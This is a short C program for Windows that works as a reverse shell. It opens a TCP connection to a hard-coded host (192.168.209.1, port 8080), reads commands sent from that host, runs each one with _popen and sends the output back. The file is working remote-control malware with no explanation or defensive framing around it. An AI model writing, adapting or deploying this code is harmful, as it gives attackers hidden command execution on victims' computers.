#include <winsock2.h>
#include <ws2tcpip.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main() {
  WSADATA wsa;
  WSAStartup(MAKEWORD(2,2), &wsa);


  SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);

  if (sock == INVALID_SOCKET) {
    printf("Could not create socket. Error: %d\n", WSAGetLastError());
    WSACleanup();
    return 1;
  }

  // Server address to connect to
  struct sockaddr_in server_addr;
  memset(&server_addr, 0, sizeof(server_addr));

  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(8080);
  inet_pton(AF_INET, "192.168.209.1", &server_addr.sin_addr);

  // Connect to remote service
  if (connect(sock, &server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
    
    printf("Unable to connect: %d\n", WSAGetLastError());
    closesocket(sock);
    WSACleanup();
    return 1;
  }

  while (1) {
    char cmd[1024];
    int total = 0;

    while (1) {
      int n = recv(sock, cmd + total, sizeof(cmd) - 1 - total, 0);

      if (n > 0) {
        total += n;
        
        if (memchr(cmd, '\n', total)) {
          break;
        }
      }
    }

    cmd[total] = '\0';
    printf("Received from server: %s", cmd);
    

    

    FILE *fp = _popen(cmd, "r");

    char output[4096];
    size_t len = fread(output, 1, sizeof(output)-1, fp);

    output[len] = '\0';
    _pclose(fp);

    send(sock, output, strlen(output), 0);
  }
}